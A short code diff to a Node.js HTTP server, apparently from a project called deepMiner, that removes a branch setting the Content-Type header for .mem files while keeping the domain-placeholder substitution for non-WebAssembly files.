@@ -29,8 +29,6 @@ var web = http.createServer((req, res) => {
 		} else {
 			if (!req.url.match(/\.wasm$/)) {
 				buf = buf.toString().replace(/%deepMiner_domain%/g, conf.domain);
-			} else if (req.url.match(/\.mem$/)){
-				res.setHeader("Content-Type","application/octet-stream");
 			}
 			res.end(buf);
 		}
